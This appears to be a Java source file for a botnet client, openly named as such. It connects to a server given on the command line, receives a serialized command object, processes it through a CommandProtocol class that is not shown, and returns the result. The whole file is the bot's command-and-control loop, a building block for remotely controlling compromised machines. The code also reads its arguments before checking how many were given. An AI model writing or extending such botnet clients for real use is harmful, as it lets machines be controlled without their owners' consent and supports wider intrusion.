import java.net.*;
import java.io.*;

/**
 * BotnetClient Class:
 * Object used to receive commands from server, process them, and send back to server
 */
public class BotnetClient {
    public static void main(String[] args) throws IOException {
        //Properties
        String hostName = args[0];
        int portNumber = Integer.parseInt(args[1]);
        CommandProtocol commandP = new CommandProtocol();
        
        //making sure class is called properly
        if (args.length != 2) {
            System.err.println("Usage: java BotnetClient <host name> <port number>");
            System.exit(1);
        }

        //bind the sockets
        try (Socket socket = new Socket(hostName, portNumber);
             ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
             ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) 
             {
            
                //Read the command from the object input stream
                Command inCommand = (Command) in.readObject();
                System.out.println("[+] Running Command " + inCommand.getCommandName());
                //using the command protocol process the command
                commandP.processCommand(inCommand);
                
                //write the command back to the server thread
                out.writeObject(inCommand);
                out.flush(); //making sure all data is sent and the stream is cleared
            
        //Error handling
        } catch (ClassNotFoundException e) {
            System.err.println("[-] BotnetClient: Problem reading object: class not found");
            e.printStackTrace();
        }catch (EOFException e) {
            System.err.println("[-] Server closed the connection.");
            e.printStackTrace();
        }
    }
}